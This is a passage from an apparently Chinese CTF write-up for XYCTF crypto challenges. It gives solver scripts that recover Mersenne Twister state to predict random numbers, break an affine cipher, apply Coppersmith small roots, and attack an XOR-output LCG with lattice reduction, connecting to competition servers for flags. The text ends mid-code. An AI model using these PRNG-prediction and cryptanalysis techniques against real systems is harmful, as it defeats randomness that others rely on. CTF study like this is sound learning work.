class="number">32</span>)</span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;nominator&#125;</span>//<span class="subst">&#123;denominator&#125;</span> = <span class="subst">&#123;nominator//denominator&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choose == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ans = <span class="built_in">input</span>(<span class="string">&#x27;input the answer: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">            rand1 = random.getrandbits(<span class="number">11000</span>)</span><br><span class="line">            rand2 = random.getrandbits(<span class="number">10000</span>)</span><br><span class="line">            correct_ans = rand1 // rand2</span><br><span class="line">            <span class="keyword">if</span> correct_ans == <span class="built_in">int</span>(ans):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;WOW&#x27;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;Here is your flag: <span class="subst">&#123;f.read()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;NOPE, the correct answer is <span class="subst">&#123;correct_ans&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>MT19937 小练习，上轮子梭</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;./MT19937-Symbolic-Execution-and-Solver-master/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process([&quot;python3&quot;, &quot;server.py&quot;])</span></span><br><span class="line">r = remote(<span class="string">&quot;47.94.172.18&quot;</span>, <span class="number">36871</span>)</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">624</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;= &#x27;</span>)</span><br><span class="line">    data.append(<span class="built_in">int</span>(r.recvline().strip()))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line"></span><br><span class="line">rng = MT19937(state_from_data = (data, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># for _ in range(624):</span></span><br><span class="line"><span class="comment">#     rng()</span></span><br><span class="line">recover = [rng() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>)]</span><br><span class="line"><span class="keyword">assert</span> recover == data, <span class="string">f&quot;Recover failed: <span class="subst">&#123;recover&#125;</span> != <span class="subst">&#123;data&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n//<span class="number">32</span>):</span><br><span class="line">        num = (rng() &lt;&lt; (<span class="number">32</span> * i)) | num</span><br><span class="line">    num = rng() &gt;&gt; (<span class="number">32</span> - (n % <span class="number">32</span>)) &lt;&lt; n//<span class="number">32</span>*<span class="number">32</span> | num</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">rand1 = getrandbits(<span class="number">11000</span>)</span><br><span class="line">rand2 = getrandbits(<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">correct_ans = rand1 // rand2</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(correct_ans).encode())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h3><p>呃，丢给 DeepSeek 就行了，只要存在 a 就能解出来，根本不用管 PRNG</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;47.94.217.82&#x27;</span>, <span class="number">26633</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">m = <span class="number">19198111</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    res = []</span><br><span class="line">    n = <span class="built_in">len</span>(table)</span><br><span class="line">    <span class="comment"># 尝试不同的字符对位置</span></span><br><span class="line">    positions = [(i, i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>)]</span><br><span class="line">    <span class="keyword">for</span> pos1, pos2 <span class="keyword">in</span> positions:</span><br><span class="line">        <span class="keyword">if</span> pos1 &gt;= <span class="built_in">len</span>(enc) <span class="keyword">or</span> pos2 &gt;= <span class="built_in">len</span>(enc):</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 避免越界</span></span><br><span class="line">        c0, c1 = enc[pos1], enc[pos2]</span><br><span class="line">        <span class="comment"># 遍历所有可能的明文字符对</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            p0 = i</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                <span class="keyword">if</span> i == j:</span><br><span class="line">                    <span class="keyword">continue</span>  <span class="comment"># 跳过相同字符对</span></span><br><span class="line">                p1 = j</span><br><span class="line">                delta_p = p1 - p0</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    inv_delta_p = <span class="built_in">pow</span>(delta_p, -<span class="number">1</span>, m)</span><br><span class="line">                <span class="keyword">except</span> ValueError:</span><br><span class="line">                    <span class="keyword">continue</span>  <span class="comment"># 无逆元则跳过（理论上不会发生）</span></span><br><span class="line">                a = ((c1 - c0) * inv_delta_p) % m</span><br><span class="line">                <span class="keyword">if</span> gcd(a, m) != <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">continue</span>  <span class="comment"># a 必须与模数互质</span></span><br><span class="line">                inv_a = <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)</span><br><span class="line">                b = (c0 - a * p0) % m</span><br><span class="line">                <span class="comment"># 验证所有密文字符</span></span><br><span class="line">                valid = <span class="literal">True</span></span><br><span class="line">                plain = []</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">                    p = ((c - b) * inv_a) % m</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= p &lt; n):</span><br><span class="line">                        valid = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    plain.append(table[p])</span><br><span class="line">                <span class="keyword">if</span> valid:</span><br><span class="line">                    res.append(<span class="string">&#x27;&#x27;</span>.join(plain))</span><br><span class="line">    <span class="keyword">return</span> res  <span class="comment"># 未找到解</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例密文（需替换为实际输出）</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;give me seed: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">enc = <span class="built_in">eval</span>(r.recvline().strip())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(enc), enc)</span><br><span class="line">flag = decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">set</span>(flag))</span><br><span class="line"><span class="comment"># XYCTF&#123;114514fixedpointissodangerous1919810&#125;</span></span><br></pre></td></tr></table></figure>

<p>会跑出不同结果，肉眼筛选一下即可。</p>
<h3 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h3><p>Coppersmith 小练习，直接把式子拆出来，然后套上多元轮子即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> coppersmith <span class="keyword">import</span> small_roots</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">n = <span class="number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line">mh = [<span class="number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span>, <span class="number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span>]</span><br><span class="line">C = [<span class="number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span>, <span class="number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span>]</span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"></span><br><span class="line">P = PolynomialRing(Zmod(n), names=<span class="string">&#x27;x, y&#x27;</span>)</span><br><span class="line">x, y = P.gens()</span><br><span class="line">mh_re, mh_im = mh</span><br><span class="line">f = -<span class="number">3</span>*mh_im**<span class="number">2</span>*mh_re + mh_re**<span class="number">3</span> - <span class="number">3</span>*mh_im**<span class="number">2</span>*x + <span class="number">3</span>*mh_re**<span class="number">2</span>*x + <span class="number">3</span>*mh_re*x**<span class="number">2</span> + x**<span class="number">3</span> - <span class="number">6</span>*mh_im*mh_re*y - <span class="number">6</span>*mh_im*x*y - <span class="number">3</span>*mh_re*y**<span class="number">2</span> - <span class="number">3</span>*x*y**<span class="number">2</span> - C[<span class="number">0</span>]</span><br><span class="line">roots = small_roots(f, (<span class="number">2</span>**bits, <span class="number">2</span>**bits), <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># print(roots)</span></span><br><span class="line"></span><br><span class="line">m_re = mh_re + <span class="built_in">int</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">m_im = mh_im + <span class="built_in">int</span>(roots[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag = ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"><span class="comment"># XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="prng-xxxx"><a href="#prng-xxxx" class="headerlink" title="prng_xxxx"></a>prng_xxxx</h3><p>我就说这个问题肯定有人想过的，搜到<a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/80834/attacks-on-lcg-with-self-xor-output-function">这篇文章</a></p>
<p>我大概翻译一下，问题形式如下：</p>
<p>$$<br>X_{i+1} = (AX_i + C) \mod 2^{n} \\<br>Y_i = (X_i/2^{n/2}) \oplus (X_i\mod 2^{n/2})<br>$$</p>
<p>解法：<br>Step 1<br>先找到 $|w_i|&lt;W$ 使得</p>
<p>$$<br>\sum_{i=1}^{m} w_i A^i \equiv 0 \pmod{2^{n/2+k}}<br>$$</p>
<p>这里可以用一个如下形式的格做 LLL 求解：</p>
<p>$$<br>\begin{pmatrix}<br>1 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 &amp; KA \\<br>0 &amp; 1 &amp; 0 &amp; \cdots &amp; 0 &amp; KA^2 \\<br>\vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots \\<br>0 &amp; 0 &amp; 0 &amp; \cdots &amp; 1 &amp; KA^m \\<br>0 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 &amp; K\cdot 2^{n/2+k} \\<br>\end{pmatrix}<br>$$</p>
<p>其中 $K$ 取适合大的值。</p>
<p>Step 2<br>然后猜 $X_0$ 的低 $k$ 位，若 C 未知，同步猜测 $C$ 的低 $k$ 位，依据这俩把整个 $X_i$ 推出来。</p>
<p>Step 3<br>此时可以理解成 $X_0$ 和 $C$ 的低 $k$ 位已知，用 $Y_i$ 把 $X_i$ 左半部分的低 $k$ 位也还原出来（这里没看懂的的去看<a target="_blank" rel="noopener" href="https://tangcuxiaojikuai.xyz/post/cb7cb618.html">鸡块哥的文章</a>），把这些位记为 $X_i^*$，即有 $X_i^* = 2^{n/2} \times \mathrm{guess}$</p>
<p>Step 4<br>推出下面的式子：</p>
<p>$$<br>\sum_{i=1}^{m} w_i [X_{i+1} - X_i] \equiv 0 \pmod{2^{n/2+k}}<br>$$</p>
<p>Step 5<br>计算<br>$$<br>Z = \sum_{i=1}^{m} w_i [X_{i+1}^* - X_i^*] \pmod{2^{n/2+k}}<br>$$<br>记 $\Delta$ 为 $Z$ 与 0 或 $2^{n/2+k}$ 的差值（选最小的一个）</p>
<p>Step 6<br>若 $\Delta \ge 2mW\cdot 2^{n/2}$，那对于 $X_i$ 的低 $k$ 位的猜测肯定是错的，否则就有 $1-2mW\cdot 2^{-k}$ 的概率是对的。</p>
<p>Step 7<br>对不同的 $Y_i$ 尝试所有 $2^k$ 的猜测，直接只剩下最后一个猜测，就是 $X_0$ 的低 $k$ 位。</p>
<p>Step 8<br>重复以上步骤，直到 $X_0$ 的所有位都被还原。</p>
<p>$k$ 应该比 $\log_2mW$ 大很多，不然 step 6 的判定就很难起作用。</p>
<p>按以上的方法搞一搞，最终 flag 为 <code>XYCTF&#123;0h_3v3n_X0R_c@n&#39;t_s@v3_LCG!&#125;</code></p>
<p>代码一坨屎就先不放了，就注意一下 step 7 的意思是不用选全部的 output，比如第一轮用 $Y_0$ 到 $Y_{31}$，第二轮用 $Y_1$ 到 $Y_{32}$，第三轮用 $Y_2$ 到 $Y_{33}$，依次类推，而且实际上也不会只剩下一个，会剩下 4 至 16 个左右。</p>
<p>改好了，端上巧克力味的史，为了方便读者理解整个流程，没有做太多的简化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b</span>):</span><br><span class="line">        <span class="variable language_">self</span>.seed = seed</span><br><span class="line">        <span class="variable language_">self</span>.a = a</span><br><span class="line">        <span class="variable language_">self</span>.b = b</span><br><span class="line">        <span class="variable language_">self</span>.m = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.seed = (<span class="variable language_">self</span>.seed * <span class="variable language_">self</span>.a + <span class="variable language_">self</span>.b) % <span class="variable language_">self</span>.m</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">self</span>.seed &gt;&gt; <span class="number">64</span>) ^ (<span class="variable language_">self</span>.seed % <span class="number">2</span>**<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lfsr</span>:</span><br><span class="line">    <span class="comment"># 我被裁了/(ㄒoㄒ)/~~</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">47026247687942121848144207491837523525</span></span><br><span class="line">output = [<span class="number">17861431650111939539</span>, <span class="number">15632044669542972472</span>, <span class="number">18085804805519111109</span>, <span class="number">11630394250634164303</span>, <span class="number">10914687109985225138</span>, <span class="number">7348450425255618214</span>, <span class="number">10796029302647050328</span>, <span class="number">14267824433700366397</span>, <span class="number">9363967587530173835</span>, <span class="number">8995382728269798714</span>, <span class="number">3504283765121786984</span>, <span class="number">1312349325731613524</span>, <span class="number">10716889342831891752</span>, <span class="number">12298317818779713512</span>, <span class="number">8701992888199838445</span>, <span class="number">7261196699430834071</span>, <span class="number">4670657923849978944</span>, <span class="number">9833942603152121381</span>, <span class="number">18304734854303383637</span>, <span class="number">15945503654626665549</span>, <span class="number">6509330987395005461</span>, <span class="number">223169047706410182</span>, <span class="number">12990946817252956584</span>, <span class="number">3884858487227858459</span>, <span class="number">6366350447244638553</span>, <span class="number">10326924732676590049</span>, <span class="number">12989931141522347344</span>, <span class="number">9197940263960765675</span>, <span class="number">2481604167192102429</span>, <span class="number">1409946688030505107</span>, <span class="number">9263229900540161832</span>, <span class="number">266892958530212020</span>, <span class="number">14298569012977896930</span>, <span class="number">17318088100106133211</span>, <span class="number">4224045753426648494</span>, <span class="number">650161332435727275</span>, <span class="number">9488449142549049042</span>, <span class="number">8916910451165068139</span>, <span class="number">10116136382602356010</span>, <span class="number">6604992256480748513</span>, <span class="number">7375827593997920567</span>, <span class="number">1661095751967623288</span>, <span class="number">4143230452547340203</span>, <span class="number">4145435984742575053</span>, <span class="number">10465207027576409947</span>, <span class="number">16146447204594626029</span>, <span class="number">2807803679403346199</span>, <span class="number">10857432394281592897</span>, <span class="number">1494771564147200381</span>, <span class="number">2085795265418108023</span>, <span class="number">11756240132299985418</span>, <span class="number">13802520243518071455</span>, <span class="number">1191829597542202169</span>, <span class="number">16603089856395516862</span>, <span class="number">12517247819572559598</span>, <span class="number">14148806699104849454</span>, <span class="number">8174845389550768121</span>, <span class="number">15565523852832475714</span>, <span class="number">10046639095828632930</span>, <span class="number">15353735627107824646</span>, <span class="number">7003433641698461961</span>, <span class="number">11217699328913391211</span>, <span class="number">6392630836483027655</span>, <span class="number">7918524192972397836</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">128</span></span><br><span class="line">m = <span class="number">32</span></span><br><span class="line">k = <span class="number">9</span></span><br><span class="line">WW = <span class="number">2</span></span><br><span class="line">step = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(k, <span class="built_in">int</span>(log(m*WW, <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_w</span>(<span class="params">n, m, k, WW, A</span>):</span><br><span class="line">    M = matrix(ZZ, m+<span class="number">1</span>, m+<span class="number">1</span>)</span><br><span class="line">    K = <span class="number">2</span>**<span class="number">200</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        M[i, i] = <span class="number">1</span></span><br><span class="line">        M[i, m] = K*a**(i+<span class="number">1</span>)</span><br><span class="line">    M[m, m] = K*<span class="number">2</span>**(n//<span class="number">2</span>+k)</span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> M.BKZ():</span><br><span class="line">        w = 